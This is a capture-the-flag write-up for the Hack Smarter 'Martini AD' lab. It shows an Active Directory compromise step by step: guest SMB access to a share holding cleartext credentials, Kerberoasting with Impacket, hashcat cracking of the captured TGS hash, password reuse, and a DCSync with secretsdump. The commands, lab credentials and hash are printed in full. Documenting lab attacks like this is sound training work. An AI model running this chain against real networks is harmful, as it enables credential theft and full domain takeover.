---
layout: single
title: 'Martini AD Write Up - Hack Smarter'
collection: writeups
author_profile: true
date: 2026-06-17
permalink: /writeups/martini/
tags: [Hack Smarter, Easy, AD, ]
---

## Overview


This write-up covers Martini AD, a tricky, easy level, Active Directory machine from the Hack Smarter platform. This machine is currently one of the free offerings on their platform, and is great practice for AD. The primary attack chain highlights the dangers of careless credential storage and poor password hygiene. If you get stuck or have any questions while working through it, don’t hesitate to send me an email.
[https://www.hacksmarter.org/courses/8da0b008-7692-4c3f-a861-b7a02a536e7b](https://www.hacksmarter.org/courses/8da0b008-7692-4c3f-a861-b7a02a536e7b) 
![martini](/images/mart/martini.png)

---

## Enumeration

In order to save time the Lab starts with the open ports already written out.

```bash
 53/tcp    open  domain
 88/tcp    open  kerberos-sec
 135/tcp   open  msrpc
 139/tcp   open  netbios-ssn
 389/tcp   open  ldap
 445/tcp   open  microsoft-ds
 464/tcp   open  kpasswd5
 593/tcp   open  http-rpc-epmap
 636/tcp   open  ldapssl
 3268/tcp  open  globalcatLDAP
 3269/tcp  open  globalcatLDAPssl
 3389/tcp  open  ms-wbt-server
 5985/tcp  open  wsman
 9389/tcp  open  adws
```
---


The attacker then enumerates the domain environment using `enum4linux` and configures their local environment to resolve the target's network.

```bash

enum4linux-ng $IP 
 
```

![enum](/images/mart/enum4linux.png)



First, the attacker maps the Domain Controller's IP address to its hostnames in the `/etc/hosts` file.

```bash
sudo nano /etc/hosts

 # Add the following line:
10.1.35.123 dry.martini.bars DC01.martini.bars martini.bars
```


Next, the attacker must configure their local Kerberos client. They modify the /etc/krb5.conf file, setting MARTINI.BARS as the default realm and pointing it to the Domain Controller. This ensures tools like Impacket can seamlessly request and parse Kerberos tickets.

```bash
sudo nano /etc/krb5.conf

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = DRY.MARTINI.BARS

[realms]
    DRY.MARTINI.BARS = {
        kdc = DC01.martini.bars
        admin_server = DC01. martini.bars
        default_domain = dry.martini.bars
    }

[domain_realm]
    .dry.martini.htb = DRY.MARTINI.BARS
    dry.martini.bars = DRY.MARTINI.BARS
```

---


Now, with the domain environment configured, the attacker uses `NetExec` to check if the Guest account is enabled and if it has access to any unauthenticated shares.

![smb1](/images/mart/GuestSMB.png)



The output confirms that the Guest account is enabled and reveals a non-standard share named notes with READ,WRITE permissions. The attacker connects directly to the share using `smbclient` and authenticating with a blank password.

```bash
smbclient //$IP/notes -U 'guest'
```



Upon Authenticating, the attacker lists the contents of the directory and discovers a single file named `notes.txt` which includes a set of cleartext credentials at the bottom.

![smb2](/images/mart/smbclient.png)

```
 - Order more gin for lakeside
 - Look for an engagement ring
 - Check that notes works from Linux Mint

 creds
 mprice:*martini*
```

---

## Exploitation 



With the `mprice` credentials validated, the attacker now has authenticated access to query Active Directory. The first step is to enumerate the domain users to map out potential targets and identify high-value accounts.


Using NetExec over SMB, the attacker pulls the list of domain users:

![UserEnum](/images/mart/userenum.png)



Alongside the standard accounts and the `mprice` user, the attacker identifies `ATHENA_SVC`. Because this is explicitly named as a Service Account, it is a prime target for a Kerberoasting attack. Service accounts often have a Service Principal Name (SPN) registered, allowing any authenticated user to request a Ticket Granting Service (TGS) ticket for them.


To execute the attack, the attacker uses Impacket's `GetUserSPNs.py`. The tool queries the Domain Controller for SPNs, requests the TGS ticket for `ATHENA_SVC`, and outputs the encrypted ticket in a crackable format.

```bash
GetUserSPNs.py -request -dc-ip $IP dry.martini.bars/mprice:'*martini*' -outputfile kerberoasting.hashes

 Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

 ServicePrincipalName         Name        MemberOf                                                          PasswordLastSet             LastLogon  Delegation 
---------------------------  ----------  ---------------------------------------------------------------  --------------------------  ---------  ----------
 HTTP/athena.dry.martini.bar  ATHENA_SVC  CN=Remote Management Users,CN=Builtin,DC=DRY,DC=MARTINI,DC=BARS  2026-01-20 13:20:32.856622  <never>     
```


The ticket is successfully captured and saved to kerberoasting.hashes.  Because the ticket is encrypted using ATHENA_SVC's NTLM hash, the attacker can take it offline and attempt to bruteforce the password without locking out the account or generating further network noise.

The attacker utilizes Hashcat with mode 13100. 

```bash
hashcat -m 13100 kerberoasting.hashes /home/nick/rockyou.txt

$krb5tgs$23$*ATHENA_SVC$DRY.MARTINI.BARS$dry.martini.bars/ATHENA_SVC*$46cf789ba62754a85aa6732b1d048bd4$8edd4e8165d5c05e5dfd86e36bc6476ca47debc9a8a3c08ca21cef89fd521525f7b7d1b29db9ec7d6cbb4102b405a09f2d07730c77cb03fbfdd62b270ae72f78a1a3f020c063881c6063d62222b8cdbc9cd9921b8511c9e624900ef3cd0536a618e7ce7183fc492f75ebe621f7c0138d78e5ace2732bf9da776d432fe5cb71191e9d55b2751fbe27b01b7836748af2543cf3dd08223ad7ec06afdca8580af34db5b93a1e3d8f2ba2bcd9a618721998f1e7137b8aea218ddf1227e6cdacd0dd6e7052b64623e253636bbaf578f9bf8920ea0ab0cc6f4a96f4c313fa60bea8514a151ed469ac58c2d2db39f5ecfe687fd4d7fc1a4558000e0fb3fc0ff1665f31e091d34ceb5caae0378e8ad66bedd241f22d473846af235bc39616f9a5c34b9007541958c1fc6e8a8d15fd00c573547267e0e5044627de93c7e8340b3e2cb2fdfd74410f2e46213cd8475e015ae96c3b58cb2255b21a7ce37d3333dd4ae5e3dc9a77b7b60acb02aedc58041032ff88548ad0463b360ff9af07858dd3060d281d8de730be05038a622ce20013d1e0679e9f3c2feeb035bde18040507ad22342f82b662bd8c1f0bad98042fbb81348595d8feef7658d2444277f155a461e3ae35a51102bf212a385baa9bd2c3885dcf4676fe08ef5f0bb643540b9444285e29127308c32e621e65f87e0961e679eac546e57a8971c26624b387e6c9470b6da8a5854b6eb32e2b9d30ea2ba37118a6ce853fafa800be6fef5864586d21eff2e6bb03fc2d33bd61cda8c802a00d84e423824e05a481a9cd229806dd165d5fdb97c060476faf6d57f8da5a416ab29dee2521f6fe89da97f971e06a0a9306645b20666bff8f14a730023c4076c220ba02d9cdd1070dbe1a802eb0a1406946dd4a187c7040d7d9dc6105ed73bb660cdb3eed13d42e00290dc6ae7e3dcd9564fb183e1e5260997544ac4a98990bad7e54a8f500233f2a94d73f4f0483bebce40b75154e2920ed140e168ac402337df46f633d339f662e89f72229044c77a2febc4336b14dcee4ef797e6e8cee83d129eb15a038f97dc8c8eaa3fbb3d1a144e84aa709fbfbc9c3b719d1464dc2f12d61e7f1480fd47e16edd203a7fcf85254bf2fb856540b9913f8aae57e04f956c237045ec4e58442273fefc7a9b19747fe7b823009d1c81d2b89818d14d4c3c4a495a29b25d6dfa401368d6427eb64612dfd31dcfe35a52c7e6f233b41c8ec5fd2ba1c53ecb23e5cc6a6fe698219f38af5f4df7d578a765fd09c3722110d9c82fc25bc5ee5f8b41f1c58bf3162c8cea0c624e5903697a002ba6b9e252bcb6139463a32d8ed33c2df3d9bb427dca37e620396964bb8c345e110935505bd549774b6a5d3fa205f4685ace1dcb274cf4f3220b1573146a3f164df73d152d6dfa068eab8754d6fc846911401e70794c9d1c15687d3c276b396b9b9515c245b1d7bb0e2cc69cdbaebda151921e4153a4bd0d855c3668112bc41ae33a6ff78ddfd3108826934e860fe4:1dirtymartini
```
---




## Privilege Escalation


After successfully mapping the domain privileges for `ATHENA_SVC`, it became apparent that the account itself did not possess a direct path to Domain Admin. However, in enterprise environments, it is a common misconfiguration for IT administrators to reuse passwords across service accounts and their own administrative accounts.
**Username: Athena_SVC, Password: 1dirtymartini**


Noticing the naming convention similarity between `ATHENA_SVC` and the `athena.t0` user, the attacker tests the newly cracked password (`1dirtymartini`) against the list of domain users over WinRM to check for lateral movement opportunities.

![Athena](/images/mart/athena2.png)



The output confirms a critical security flaw: password reuse. The `athena.t0` account shares the exact same password as the service account. 


To verify the extent of the account's access and check for administrative rights, the attacker pivots to enumerate the SMB shares using the compromised `athena.t0` credentials:

![admin](/images/mart/adminsmb.png)



The READ,WRITE access to the `ADMIN$` and `C$` shares confirms that `athena.t0` is a highly privileged administrator.


The ultimate objective for this machine is to retrieve the NT hash of the `krbtgt` account. Using Impacket's `secretsdump.py`, the attacker passes the compromised `athena.t0` credentials to the target. The tool successfully executes a DCSync attack, extracting the krbtgt hash along with the rest of the domain credentials, proving a complete compromise of the Martini Bars environment and completing the machine.

```bash
secretsdump.py 'dry.martini.bars/athena.t0:1dirtymartini@dry.martini.bars'
```
